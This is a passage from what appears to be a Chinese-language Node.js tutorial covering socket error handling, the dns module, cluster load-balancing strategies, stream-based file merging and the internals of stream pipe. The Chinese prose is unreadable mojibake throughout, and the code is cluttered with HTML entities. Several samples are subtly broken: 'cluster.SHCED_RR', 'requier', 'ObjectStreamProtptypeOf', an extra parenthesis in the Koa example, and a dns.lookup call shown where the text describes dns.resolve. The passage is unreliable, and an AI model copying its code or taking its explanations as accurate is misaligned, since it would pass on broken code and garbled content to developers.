è®°å½•ä¸å®Œæ•´çš„åŒ… &#125;).on('end', () =&gt; &#123; console.log('socket end') &#125;).on('error', error =&gt; &#123; console.log('socket error', error) &#125;)&#125;).on('close', () =&gt; &#123; console.log('Server Close!')&#125;).on('error', err =&gt; &#123; if (err.code === 'EADDRINUSE') &#123; console.log('åœ°å€æ­£è¢«ä½¿ç”¨ï¼Œé‡è¯•ä¸­......') setTimeout(() =&gt; &#123; server.close(); server.listen(PORT.HOST) &#125;, 1000) &#125; else &#123; console.log(`æœåŠ¡å™¨å¼‚å¸¸: $&#123;err&#125;`) &#125;&#125;) DNSDNSæ¨¡å—æ˜¯åŸºäºŽUDPåè®®æ¥å®žçŽ°çš„ï¼Œåœ¨Nodejsä¸­å¯ä»¥é€šè¿‡require(&#39;dns&#39;)å®žçŽ°åŸŸåçš„è§£æžæŸ¥è¯¢ï¼ŒNodejs DNSæ¨¡å—åˆ†æˆä¸¤å¤§ç±»ï¼š åº•å±‚æ“ä½œç³»ç»Ÿå·¥å…·è¿›è¡ŒåŸŸåè§£æž é“¾æŽ¥åˆ°ä¸€ä¸ªDNSç½‘ç»œæœåŠ¡å™¨æ‰§è¡ŒåŸŸåè§£æž åº•å±‚æ“ä½œå·¥å…·åŸŸåè§£æž123456// Nodejs DNSæ¨¡å—çš„ dns.lookup()æ–¹æ³•ä½¿ç”¨åº•å±‚æ“ä½œç³»ç»Ÿè¿›è¡ŒåŸŸåè§£æžï¼Œæ˜¯ä¸éœ€è¦ç»è¿‡ç½‘ç»œé€šä¿¡çš„const dns = require('dns');dns.lookup('laibh.top',(err,address,family)=&gt;&#123; console.log(`åœ°å€: $&#123;address&#125;,åœ°å€æ—ï¼š$&#123;family&#125;`)&#125;) é“¾æŽ¥åˆ°DNSæœåŠ¡å™¨æ‰§è¡ŒåŸŸåè§£æž12345// dns æ¨¡å—é™¤äº† dns.lookupä¹‹å¤–çš„å‡½æ•°ï¼Œéƒ½ä¼šè¿žæŽ¥åˆ°å®žé™…DNSæœåŠ¡å™¨ä»¥æ‰§è¡Œåç§°è§£æžå¹¶å§‹ç»ˆä½¿ç”¨ç½‘ç»œæ‰§è¡ŒDNSæŸ¥è¯¢const dns = require('dns');dns.lookup('laibh.top',(err,records)=&gt;&#123; console.log(records)&#125;) dns.lookupä¸Ždns.resolveä¸åŒ è™½ç„¶ç”¨å¼‚æ­¥çš„è§’åº¦æ¥ä½¿ç”¨dns.lookupï¼Œä½†æ˜¯å†…éƒ¨çš„libuvåº•å±‚çº¿ç¨‹æ± ä¸­ç¡®å®žåŒæ­¥çš„è°ƒç”¨ getaddrinfo(3)ï¼Œæ‰€ä»¥å¯èƒ½æœ‰ç”±äºŽä¸€äº›ä¸ç¡®å®šçš„å› ç´ é€ æˆNodeè¿›ç¨‹é˜»å¡ž ä¸Ždns.lookupä¸åŒçš„æ˜¯dns.resolveæ²¡æœ‰ä½¿ç”¨getaddrinfo(3)ï¼Œè€Œé€šè¿‡ç½‘ç»œæ‰§è¡Œçš„DNSæŸ¥è¯¢ï¼Œå§‹ç»ˆä¿æŒå¼‚æ­¥ä¸ä¼šå¯¹å…¶ä»–è¿›ç¨‹äº§ç”Ÿè´Ÿé¢å½±å“ DNSåŸŸåè§£æžè¿‡ç¨‹ æµè§ˆå™¨DNSç¼“å­˜ã€‚è®¿é—®ä¸€ä¸ªURLä¼˜å…ˆæŸ¥æ‰¾æµè§ˆå™¨çš„DNSç¼“å­˜ï¼Œå‘½ä¸­å°±è¿”å›žã€‚æœªå‘½ä¸­å°±ç»§ç»­ä¸‹ä¸€æ­¥ï¼ŒæŸ¥æ‰¾æ“ä½œç³»ç»Ÿçš„ç¼“å­˜ã€‚å½“ä¿®æ”¹äº†æœ¬åœ°hostsåŸŸåæŒ‡å‘å‘çŽ°æµè§ˆå™¨ç¼“å­˜æ²¡æœ‰å˜åŒ–æ˜¯å› ä¸ºæ¯ä¸ªæµè§ˆå™¨æœ‰ä¸€ä¸ªå›ºå®šå€¼ã€‚ ç³»ç»Ÿï¼ˆOSï¼‰ç¼“å­˜ã€‚æŸ¥çœ‹æ“ä½œç³»ç»Ÿä¸­æ˜¯å¦æœ‰åŸŸåå¯¹åº”çš„IP,ä½äºŽæ“ä½œç³»ç»Ÿçš„hostsæ–‡ä»¶ã€‚ è·¯ç”±å™¨ç¼“å­˜ã€‚å½“æµè§ˆå™¨DNSä¸Žç³»ç»ŸOSç¼“å­˜å‡æ²¡æœ‰æ˜ å°„çš„æ—¶å€™ï¼Œåˆ™è¯·æ±‚ä¼šå‘é€åˆ°è·¯ç”±å™¨ç¼“å­˜ä¸­æ£€æŸ¥ ISP DNSç¼“å­˜ã€‚ISPä¸ºäº’è”ç½‘æœåŠ¡æä¾›å•†ã€‚ DNSæœ¬åœ°è§£æžæŒ‡çš„æ˜¯ç³»ç»Ÿç¼“å­˜è¿™ä¸€é˜¶æ®µï¼Œåœ¨æµè§ˆå™¨ç¼“å­˜æ²¡æœ‰å‘½ä¸­çš„æƒ…å†µä¸‹ï¼Œ ä¼šä»Žæœ¬åœ°ç³»ç»Ÿçš„ä¸€ä¸ªhostsæ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„IP Cluster ï¼ˆé›†ç¾¤ï¼‰åœ¨PM2çš„é…ç½®æ–‡ä»¶ä¸­å¯ä»¥è®¾ç½®exec_model:&#39;clusterå’Œinstanceä¸¤ä¸ªå±žæ€§æ¥è®¾ç½®å¼€å¯å¤šä¸ªè¿›ç¨‹ï¼ŒPM2å…¶å®žå°±æ˜¯åˆ©ç”¨Nodejs Clusterè¿™ä¸ªæ¨¡å—æ¥å®žçŽ°çš„ï¼Œè¿˜æœ‰eggJsä¸­çš„egg-clusteræ¨¡å—åœ¨å¯ç”¨Workerè¿›ç¨‹ä¹Ÿæ˜¯ç”¨åˆ°è¿™ä¸ªæ¨¡å—ã€‚ 123456789101112131415161718const cluster = require('cluster');const http = require('http');const numCPUs = require('os').cpus().length;if (cluster.isMaster) &#123; console.log(`Master è¿›ç¨‹ $&#123;process.pid&#125; æ­£åœ¨è¿è¡Œ`) for (let i = 0; i &lt; numCPUs; i++) &#123; cluster.fork(); &#125; cluster.on('exit', (worker, code, signal) =&gt; &#123; console.log(`Worker $&#123;worker.process.pid&#125; å·²é€€å‡º`) &#125;);&#125; else &#123; http.createServer((req, res) =&gt; &#123; res.send(`ä½ å¥½ï¼Œå“ˆå“ˆå“ˆ $&#123;process.pid&#125;`) &#125;).listen(8000); console.log(`Worker è¿›ç¨‹ $&#123;process.pid&#125; å·²å¯ç”¨`)&#125; é‡‡ç”¨äº†å“ªç§é›†ç¾¤æ–¹å¼é›†ç¾¤æ¨¡å¼é€šå¸¸å®žçŽ°æœ‰ä¸¤ç§ï¼š 1ä¸ªNodeå®žä¾‹å¼€å¯å¤šä¸ªç«¯å£ï¼Œé€šè¿‡åå‘ä»£ç†æœåŠ¡å™¨å‘å„ç«¯å£æœåŠ¡è¿›è¡Œè½¬å‘ 1ä¸ªNodeå®žä¾‹å¼€å¯å¤šä¸ªè¿›ç¨‹ç›‘å¬åŒä¸€ä¸ªç«¯å£ï¼Œé€šè¿‡è´Ÿè½½å‡è¡¡æŠ€æœ¯åˆ†é…è¯·æ±‚ï¼ˆMaster-&gt;Workerï¼‰ ç¬¬ä¸€ä¸ªæ–¹æ¡ˆå­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯å ç”¨å¤šä¸ªç«¯å£ï¼Œé€ æˆèµ„æºæµªè´¹ï¼Œç”±äºŽå¤šä¸ªå®žä¾‹æ˜¯ç‹¬ç«‹è¿è¡Œçš„ï¼Œè¿›ç¨‹é—´é€šä¿¡ä¸å¤ªå¥½åšã€‚å¥½å¤„æ˜¯ç¨³å®šæ€§é«˜ï¼Œå„å®žä¾‹ä¹‹é—´æ²¡æœ‰å½±å“ã€‚ ç¬¬äºŒä¸ªæ–¹æ¡ˆå¤šä¸ªNodeè¿›ç¨‹åŽ»ç›‘å¬åŒä¸€ä¸ªç«¯å£ï¼Œå¥½å¤„æ˜¯è¿›ç¨‹é—´é€šä¿¡ç›¸å¯¹ç®€å•ï¼Œå‡å°‘äº†ç«¯å£çš„èµ„æºæµªè´¹ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™éœ€è¦ä¿è¯æœåŠ¡è¿›ç¨‹çš„ç¨³å®šæ€§ï¼Œç‰¹åˆ«æ˜¯å¯¹Masterè¿›ç¨‹ç¨³å®šæ€§è¦æ±‚ä¼šæ›´é«˜ï¼Œç¼–ç ä¹Ÿä¼šå¤æ‚ã€‚ Nodejsä¸­è‡ªå¸¦çš„Clusteræ¨¡å—æ­£æ˜¯é‡‡ç”¨äº†ç¬¬äºŒç§æ–¹æ¡ˆã€‚ å¤šä¸ªè¿›ç¨‹ä¸ºä»€ä¹ˆå¯ä»¥ç›‘å¬åŒä¸€ä¸ªç«¯å£ç«¯å£ä¸æ˜¯è¢«æ‰€æœ‰çš„è¿›ç¨‹å…¨éƒ¨ç›‘å¬ï¼Œä»…ä»…å—åˆ°Masterè¿›ç¨‹çš„ç›‘å¬ã€‚Masterè¿›ç¨‹åˆ›å»ºä¸€ä¸ªSocketå¹¶ç»‘å®šç›‘å¬åˆ°ç›®æ ‡ç«¯å£ï¼Œé€šè¿‡å­è¿›ç¨‹ä¹‹é—´å»ºç«‹IPCé€šé“ä¹‹åŽï¼Œé€šè¿‡è°ƒç”¨å­è¿›ç¨‹çš„sendæ–¹æ³•ï¼Œå°†Socketï¼ˆé“¾æŽ¥å¥æŸ„ï¼‰ä¼ é€’è¿‡åŽ»ã€‚ï¼ˆMasteré€šè¿‡cluster.forkæ–¹æ³•åˆ›å»ºçš„ï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨äº†child_process.forkè¿™ä¸ªæ–¹æ³•ï¼‰ ä½¿ç”¨ child_process.fork()åˆ›å»ºçš„å­è¿›ç¨‹ï¼Œè¿›è¡ŒSocketä¼ é€’çš„ç¤ºä¾‹ 123456789101112131415161718192021222324252627// master.jsconst fork = require('child_process').fork;const cpus = require('os').cpus();const server = require('net').createServer().listen(3000);for (let i=0; i&lt;cpus.length; i++) &#123; const worker = fork('worker.js'); // å°† Master çš„ server ä¼ é€’ç»™å­è¿›ç¨‹ worker.send('server', server); console.log('worker process created, pid: %s ppid: %s', worker.pid, process.pid);&#125;// worker.jsconst http = require('http');const server = http.createServer((req, res) =&gt; &#123; res.end('I am worker, pid: ' + process.pid + ', ppid: ' + process.ppid);&#125;);let worker;// ç¬¬äºŒä¸ªå‚æ•° sendHandle å°±æ˜¯å¥æŸ„ï¼Œå¯ä»¥æ˜¯ TCPå¥—æŽ¥å­—ã€TCPæœåŠ¡å™¨ã€UDPå¥—æŽ¥å­—ç­‰process.on('message', function (message, sendHandle) &#123; if (message === 'server') &#123; worker = sendHandle; worker.on('connection', function(socket) &#123; server.emit('connection', socket); &#125;); &#125;&#125;); ç«¯å£ä¼šè¢«ä¸»è¿›ç¨‹ç»‘å®šç›‘å¬ä¸€æ¬¡ï¼Œä½†æ˜¯ä¸»è¿›ç¨‹å’Œå­è¿›ç¨‹åœ¨å»ºç«‹IPCé€šä¿¡ä¹‹åŽï¼Œå‘é€Socketåˆ°å­è¿›ç¨‹å®žçŽ°ç«¯å£å…±äº«ï¼Œåœ¨ä¹‹åŽMasteræŽ¥å—åˆ°æ–°çš„å®¢æˆ·ç«¯é“¾æŽ¥åŽï¼Œé€šè¿‡è´Ÿè½½å‡è¡¡æŠ€æœ¯å†è½¬å‘åˆ°å„Workerè¿›ç¨‹ã€‚ å¤šä¸ªè¿›ç¨‹ä¹‹é—´å¦‚ä½•é€šä¿¡ç”±äºŽcluster.forkæœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨child_process.fork()è¿™ä¸ªæ–¹æ³•æ¥åˆ›å»ºå­è¿›ç¨‹ï¼Œè¿›ç¨‹é—´é€šä¿¡æ— éžå‡ ç§ï¼špipeï¼ˆç®¡é“ï¼‰ã€æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·é‡ã€Domain Socketã€‚Nodejsä¸­æ˜¯é€šè¿‡pipe(ç®¡é“)å®žçŽ°çš„ï¼Œpipeä½œç”¨äºŽä¹‹é—´æœ‰è¡€ç¼˜å…³ç³»çš„è¿›ç¨‹ï¼Œé€šè¿‡forkä¼ é€’ï¼Œå…¶æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼Œå°†ä¸€ä¸ªè¿›ç¨‹çš„è¾“å‡ºä½œä¸ºå¦å¤–ä¸€ä¸ªè¿›ç¨‹çš„è¾“å…¥ã€‚ å¦‚ä½•å¯¹å¤šä¸ªWorkerè¿›è¡Œè¯·æ±‚è½¬å‘åœ¨Nodejsä¸­ä½¿ç”¨äº†RoundRobinè´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œç®€ç§°RP,å®ƒçš„å®žçŽ°åŽŸç†æ˜¯ä¸€ç§æ— çŠ¶æ€çš„è½®è¯¢ç­–ç•¥ï¼Œå‡å®šæ¯å°æœåŠ¡å™¨çš„ç¡¬ä»¶èµ„æºã€å¤„ç†æ€§èƒ½éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ ¹æ®è¿›ç¨‹çš„æ•°é‡ï¼Œä¾æ¬¡åˆ†é…ï¼Œç›´åˆ°æ‰€æœ‰è¿›ç¨‹å¤„ç†å®Œäº†ï¼Œå†å¼€å§‹é‡æ–°è®¡ç®—åˆ†é…ã€‚ä¼˜ç‚¹æ˜¯å®žçŽ°èµ·æ¥ç®€æ´ä¹Ÿæ˜“ç”¨ï¼Œç¼ºç‚¹æ˜¯å¦‚æžœå‡ºçŽ°æŸä¸ªè¯·æ±‚å ç”¨çš„æ—¶é—´è¾ƒé•¿ï¼Œå°±ä¼šå¯¼è‡´è´Ÿè½½ä¸ä¼šå¤ªå‡è¡¡ã€‚ RPè¿™ç§è´Ÿè½½å‡è¡¡æŠ€æœ¯é€‚ç”¨äºŽåŒä¸€ç»„æœåŠ¡å™¨æ‹¥æœ‰ç›¸åŒçš„è½¯ç¡¬ä»¶é…ç½®ä¸”å¹³å‡çš„æœåŠ¡è¯·æ±‚å“åº” RPæ˜¯ä¸€ç§å¸¸è§çš„å¤æ‚å‡è¡¡æŠ€æœ¯ï¼ŒNginxä¸­ä¹Ÿæœ‰ä½¿ç”¨ï¼Œå¦å¤–åœ¨RPçš„åŸºç¡€ä¸Šè¿˜è¡ç”Ÿäº†ä¸€ä¸ªWeighted Round-Robinæƒé‡è´Ÿè½½å‡è¡¡è½®è¯¢ç®—æ³•ï¼Œç®€ç§°WRR,åŒæ ·ä¹Ÿæ˜¯ä½¿ç”¨è½®è¯¢çš„æŠ€æœ¯ï¼Œä½†æ˜¯åœ¨åŸºç¡€ä¸Šè€ƒè™‘äº†æœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›ï¼Œå®žçŽ°æ—¶ä¸ºæœåŠ¡å™¨åŠ ä¸Šæƒé‡ï¼Œè¿™ç§è´Ÿè½½å‡è¡¡ç®—æ³•èƒ½å¤Ÿç¡®ä¿é«˜æ€§èƒ½çš„æœåŠ¡å™¨å¾—åˆ°æ›´å¤šçš„ä½¿ç”¨çŽ‡ï¼Œé¿å…ä½Žæ€§èƒ½çš„æœåŠ¡å™¨è´Ÿè½½è¿‡é‡ã€‚ Nodejsè´Ÿè½½å‡è¡¡ç­–ç•¥è®¾ç½® RoundRobin,RRã€‚è®¾ç½®æ—¶è¦ä½¿ç”¨cluster.SCHED_RR,å¦‚æžœé€šè¿‡çŽ¯å¢ƒå˜é‡è®¾ç½®è¦ä½¿ç”¨rr,å¦‚æžœç”¨clusterå¯¹è±¡èŽ·å– schedulingPolicyæ•°å­—è¡¨ç¤ºä¸º2 Shared Socketï¼ŒSS,è®¾ç½®æ—¶è¦ç”¨cluster.SCHED_NONEï¼Œå¦‚æžœé€šè¿‡çŽ¯å¢ƒå˜é‡è®¾ç½®è¦ç”¨node,å¦‚æžœç”¨clusterå¯¹è±¡èŽ·å–schedulingPolicyæ•°å­—è¡¨ç¤ºä¸º1 12345678910111213// clusterå¯¹è±¡çš„schedulingPolicyå±žæ€§è®¾ç½®const cluster = require('cluster');// ç­–ç•¥ä¸€ï¼šä¸€ç§è½®è¯¢çš„ç­–ç•¥ï¼Œé»˜è®¤å€¼cluster.schedulingPolicy = cluster.SHCED_RR;// ç­–ç•¥äºŒ:ç”±æ“ä½œç³»ç»Ÿè°ƒåº¦çš„ç­–ç•¥cluster.schedulingPolicy = cluster.SCHED_NONE;cluster.fork();// æˆ–è€…é€šè¿‡çŽ¯å¢ƒå˜é‡ NODE_CLUSTER_SCHED_POLICYè®¾ç½®ï¼šenv NODE_CLUSTER_SCHED_POLICY = 'none' node app.js åŸºäºŽStreamå®žçŽ°å¤šæ–‡ä»¶åˆå¹¶ä¸€ä¸ªç®€å•çš„Streamæ“ä½œåˆ›å»ºä¸€ä¸ªå¯è¯»æµreadableä¸€ä¸ªå¯å†™æµwriteableï¼Œé€šè¿‡ç®¡é“pipeå°†å¯å†™æµç»‘åˆ°å¯è¯»æµï¼Œä¸€ä¸ªç®€å•çš„Streamæ“ä½œå°±å¯ä»¥å®Œæˆ 12345678910111213141516171819const fs = require('fs');const readable = fs.createReadStream('./log/read.txt');const writeable = fs.createWriteStream('./log/write.txt');readable.pipe(writeable)// readable.pip(destionation[,option])// destionationï¼šæ˜¯ä¸€ä¸ªå¯å†™æµå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ•°æ®å†™å…¥çš„ç›®æ ‡å¯¹è±¡// options:end,è¯»å–ç»“æŸæ—¶ç»ˆæ­¢å†™å…¥æµï¼Œé»˜è®¤å€¼æ˜¯true// é»˜è®¤æƒ…å†µä¸‹ä¸éœ€è¦æ‰‹åŠ¨è°ƒç”¨å†™å…¥æµçš„endæ–¹æ³•å…³é—­çš„ï¼Œæ›´æ”¹endä¸ºfalseå†™å…¥çš„ç›®æ ‡å°†ä¼šå¤„äºŽä¸€ç›´æ‰“å¼€çŠ¶æ€ï¼Œæ­¤æ—¶å°±éœ€è¦ç›‘å¬å¯è¯»æµçš„endæ—¶é—´ï¼Œç»“æŸä¹‹åŽæ‰‹åŠ¨è°ƒç”¨å¯å†™æµçš„endäº‹ä»¶ã€‚readable.pipe(writeable,&#123; end:false&#125;);readable.on('end',()=&gt;&#123; writeable.end('ç»“æŸ')&#125;) å¦‚æžœå¯è¯»æµæœŸé—´å‘ä»€ä¹ˆä»€ä¹ˆé”™è¯¯ï¼Œåˆ™å†™å…¥çš„ç›®æ ‡æµå°†ä¸ä¼šå…³é—­ï¼Œæ‰€ä»¥éœ€è¦ç›‘å¬é”™è¯¯äº‹ä»¶ï¼Œæ‰‹åŠ¨å…³é—­å¯å†™æµï¼Œé˜²æ­¢å†…å­˜æ³„éœ²ã€‚ å¤šä¸ªæ–‡ä»¶é€šè¿‡Streamåˆå¹¶æˆä¸€ä¸ªæ–‡ä»¶è®¾ç½®å¯è¯»æµçš„endä¸ºfalseå¯ä»¥ä¿æŒå†™å…¥æµä¸€ç›´å¤„äºŽæ‰“å¼€çŠ¶æ€ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œä¸€å¼€å§‹å¯å†™æµå¤„äºŽæ‰“å¼€çŠ¶æ€ï¼ŒçŸ¥é“æ‰€æœ‰çš„å¯è¯»æµç»“æŸï¼Œæˆ‘ä»¬å†å°†å¯å†™æµå…³é—­ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142const fs = require('fs');const path = require('path');/** * Stream åˆå¹¶ * @param &#123;String&#125; sourceFiles æºæ–‡ä»¶ç›®å½•å * @param &#123;String&#125; targetFile ç›®æ ‡æ–‡ä»¶*/function streamMerge(sourceFiles, targetFile) &#123; const scripts = fs.readdirSync(path.resolve(__dirname, sourceFiles)); // èŽ·å–æºæ–‡ä»¶ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ const fileWriteStream = fs.createWriteStream(path.resolve(__dirname, targetFile)); // åˆ›å»ºä¸€ä¸ªå¯å†™æµ streamMergeRecursive(scripts, fileWriteStream);&#125;/** * Stream åˆå¹¶çš„é€’å½’è°ƒç”¨ * @param &#123;Array&#125; scripts * @param &#123;Stream&#125; fileWriteStream*/function streamMergeRecursive(scripts = [], fileWriteStream) &#123; // é€’å½’åˆ°å°¾ çš„æƒ…å†µåˆ¤æ–­ if (!scripts.length) &#123; return fileWriteStream.end("console.log('Stream åˆå¹¶å®Œæˆ')") // æœ€åŽå…³é—­å¯å†™æµï¼Œé˜²æ­¢å†…å­˜æ³„éœ² &#125; const currentFile = path.resolve(__dirname, 'scripts/', scripts.shift()); const currentReadStream = fs.createReadStream(currentFile); // èŽ·å–å½“å‰çš„å¯è¯»æµ currentReadStream.pipe(fileWriteStream, &#123; end: false &#125;); currentReadStream.on('end', () =&gt; &#123; streamMergeRecursive(scripts, fileWriteStream) &#125;) currentReadStream.on('error', (error) =&gt; &#123; // ç›‘å¬é”™è¯¯äº‹ä»¶ï¼Œå…³é—­å¯è¯»æµï¼Œé˜²æ­¢å†…å­˜æ³„éœ² console.log(error); fileWriteStream.close() &#125;)&#125;streamMerge('./scripts', './script.js') Stream pipeçš„ä½¿ç”¨ä¸Žå®žçŽ°åŽŸç†é€šè¿‡æµæˆ‘ä»¬å¯ä»¥å°†ä¸€å¤§å—æ•°æ®æ‹†åˆ†ç§°ä¸ºä¸€å°éƒ¨åˆ†ä¸€ç‚¹ä¸€ç‚¹çš„æµåŠ¨èµ·æ¥ï¼Œä¸éœ€è¦ä¸€æ¬¡æ€§å…¨éƒ¨è¯»å…¥ï¼Œåœ¨Linuxä¸‹å¯ä»¥é€šè¿‡|ç¬¦å·å®žçŽ°ï¼Œç±»ä¼¼çš„åœ¨Nodejsçš„Streamæ¨¡å—ä¸­åŒæ ·ä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº† pipeæ–¹æ³•æ¥å®žçŽ° æœªä½¿ç”¨Stream pipeçš„æƒ…å†µåœ¨Nodejsä¸­I/Oæ“ä½œéƒ½æ˜¯å¼‚æ­¥çš„ï¼Œå…ˆç”¨utilæ¨¡å—çš„promiseifyæ–¹æ³•å°†fs.readFileçš„callbackå½¢å¼è½¬æ¢ä¸ºPromiseå½¢å¼ ï¼Œå®ƒå°†æ•°æ®ä¸€æ¬¡æ€§è¯»å…¥å†…å­˜ç„¶åŽå†è¿›è¡Œè¿”å›žï¼Œå½“æ•°æ®æ–‡ä»¶å¾ˆå¤§çš„æ—¶å€™ä¹Ÿæ˜¯å¯¹å†…å­˜çš„ä¸€ç§æ¶ˆè€—ï¼Œä¸æŽ¨è 123456789101112131415// koa çš„ä¾‹å­const Koa = require('koa');const fs = require('fs');const app = new Koa();const &#123;promisify&#125; = require('util');const &#123;resolve&#125; = require('path');const readFile = promisify(fs.readFile);app.use(async ctx=&gt;&#123; try&#123; ctx.body = await readFile(resolve(__dirname,'test.json'))) &#125;catch(err)&#123; ctx.body = err &#125;&#125;).listen(3000) ä½¿ç”¨Steam pipe12345678910111213app.use(async ctx=&gt;&#123; try&#123; const readable = fs.createReadStream(resolve(__dirname,'test.json')); ctx.body = readable; &#125;catch(err)&#123; ctx.body = err; &#125;&#125;)// åœ¨Koaä¸­ç›´æŽ¥åˆ›å»ºä¸€ä¸ªå¯è¯»æµèµ‹å€¼ç»™ctx.bodyï¼Œæ¡†æž¶å†…å°è£…å¥½äº†pipeæ–¹æ³•ï¼Œä¸‹é¢ä¸ºæºç function respond(ctx)&#123; let body = ctx.body; if(body instanceof Stream) return body.pipe(res)&#125; ä½¿ç”¨ä¸Žä¸ä½¿ç”¨Streamä½¿ç”¨äº†å¯è¯»æµï¼Œé€šè¿‡pipeæŽ¥å£ç›‘å¬dataä¸Žendäº‹ä»¶ï¼ŒæŠŠdataçš„å¯è¯»æµæ‹†åˆ†ç§°ä¸ºä¸€å°å—ä¸€å°å—çš„æ•°æ®ï¼ˆchunksï¼‰ï¼Œåƒæµæ°´ä¸€æ ·æºæºä¸æ–­åç»™å®¢æˆ·ç«¯ï¼Œè€Œä¸å†éœ€è¦ç­‰å¾…æ•´ä¸ªæ–‡ä»¶éƒ½åŠ è½½åˆ°å†…å­˜åŽæ‰å‘é€æ•°æ®ã€‚pipeå¯ä»¥è§†ä¸ºæµçš„ç®¡é“/é€šé“æ–¹æ³•ï¼Œä»»ä½•ç±»åž‹çš„æµéƒ½ä¼šæœ‰è¿™ä¸ªæ–¹æ³•æ¥å¤„ç†æµçš„è¾“å…¥ä¸Žè¾“å‡ºã€‚ æ€»ä½“æ¥è¯´ï¼Œä½¿ç”¨æµå¯ä»¥å¤§å¤§æå‡å“åº”æ—¶é—´ï¼Œåˆèƒ½æœ‰æ•ˆå‡è½»æœåŠ¡å™¨å†…å­˜çš„åŽ‹åŠ› æºç åˆ†æžåœ¨åº”ç”¨å±‚è°ƒç”¨ fs.createReadStream æ–¹æ³•ï¼Œæ‰¾åˆ°è¿™ä¸ªæ–¹æ³•åˆ›å»ºçš„å¯è¯»æµå¯¹è±¡pipeçš„æ–¹æ³•å®žçŽ° /lib/fs.js123456789101112131415161718// å¯¼å‡ºä¸€ä¸ªcreateReadStreamæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢åˆ›å»ºä¸€ä¸ªReadSreamå¯è¯»æµå¯¹è±¡ï¼Œä¸”ReadStreamæ¥è‡ªinternal/fs/streams// æ‡’åŠ è½½ï¼Œä¸»è¦åœ¨ç”¨åˆ°çš„æ—¶å€™ç”¨æ¥å®žä¾‹åŒ– ReadStream/WriteStreamç­‰å¯¹è±¡function lazyLoadStreams()&#123; if(!ReadStream)&#123; (&#123;ReadStream,WriteStream&#125;) = require('internal/fs/streams'); [FileReadStream,FileWriteStream] = [ReadStream,WriteStream]; &#125;&#125;function createReadStream(path,options)&#123; lazyLoadStreams(); return new ReadStream(path,options); // åˆ›å»ºä¸€ä¸ªå¯è¯»æµ&#125;module.exports = fs = &#123; createReadStream, // å¯¼å‡º createReadStream æ–¹æ³•&#125; /lib/internal/fs/streams.js12345678910111213141516171819202122// è¿™ä¸ªæ–¹æ³•å®šä¹‰äº†æž„é€ å‡½æ•° ReadStreamï¼Œä¸”åœ¨åŽŸåž‹ä¸Šå®šä¹‰äº† openã€_readã€_destroyç­‰æ–¹æ³•ï¼Œæ²¡æœ‰pipeæ–¹æ³•ï¼Œé€šè¿‡ObjectSetPrototypeOfæ–¹æ³•å®žçŽ°äº†ç»§æ‰¿ï¼ŒReadStreamç»§æ‰¿äº†Readableåœ¨åŽŸåž‹ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œç»§ç»­æŸ¥æ‰¾Readableçš„å®žçŽ°const &#123;Readable,Writeable&#125; = require('stream');function ReadStream(path,options)&#123; if(!(this instanceof ReadStream)) return new ReadStream(path,options) Readable.call(this,options)&#125;ObjectSetPrototypeOf(ReadStream.prototype,Readable.prototype);ObjectStreamProtptypeOf(ReadStream,Readable);ReadStream.prototype.open = function()&#123;&#125;ReadStream.prototype._read = function(n)&#123;&#125;ReadStream.prototype._destroy = function(err,cb)module.exports = &#123; ReadStream, WriteStream&#125; /lib/stream.js123456789// to avoid cross-reference(require) issueconst Stream = module.exports = require('internal/streams/legacy');Stream.Readable = require('_stream_readable');Stream.Writable = require('_stream_writable')Stream.Duplex = require('_stream_duplex');Stream.Transform = requier('_stream_transform');Stream.PassThrough = require('_stream_passthrough'); /lib/internal/streams/legacy.js123456789101112131415// ç»§æ‰¿äº†Events æ¨¡å—ï¼Œç„¶åŽåœ¨åŽŸåž‹ä¸Šå®šä¹‰äº†pipeæ–¹æ³•ï¼Œè€Œ_stream_readableç»§æ‰¿äº†Streamä¹‹åŽåˆè‡ªå·±å®žçŽ°äº†pipeæ–¹æ³•const &#123;ObjectSetPrototypeOf&#125; = primordials;const EE = require('events');function Stream(opts)&#123; EE.call(this,opts)&#125;ObjectSetPrototypeOf(Stream.prototype,EE.prototype);ObjectSetPrototypeOf(Stream,EE);Stream.prototype.pipe = function(dest,options)&#123; // ...&#125;module.exports = Stream; /lib/_stream_readable.js123456789101112131415// å®šä¹‰äº†Readableæž„é€ å‡½æ•°ï¼Œä¸”ç»§æ‰¿äºŽlib/stream.jsçš„Streamï¼Œç„¶åŽé‡å†™pipeæ–¹æ³•module.exports = Readable;Readable.ReadableState = ReadableState;const EE = require('events');const Stream = require('stream');ObjectSetPrototypeOf(Readable.prototype,Stream.prototype)ObjectSetPrototypeOf(Readable,Stream);function Readable(options)&#123; if(!(this instanceof Readable)) return new Readable(options) Stream.call(this,options); // ç»§æ‰¿è‡ª Streamæž„é€ å‡½æ•°çš„å®šä¹‰&#125; _stream_readable.jså®žçŽ°åˆ†æž1.å£°æ˜Žæž„é€ å‡½æ•°Readableï¼Œç»§æ‰¿Streamçš„æž„é€ å‡½æ•°å’ŒåŽŸåž‹ã€‚ æ–‡ä»¶ç»§æ‰¿äº†eventsäº‹ä»¶ï¼Œæ‹¥æœ‰äº†eventsåœ¨åŽŸåž‹ä¸­å®šä¹‰çš„å±žæ€§ï¼Œä¾‹å¦‚onã€emit 2.å£°æ˜Žpipeæ–¹æ³•ï¼Œè®¢é˜…dataäº‹ä»¶ 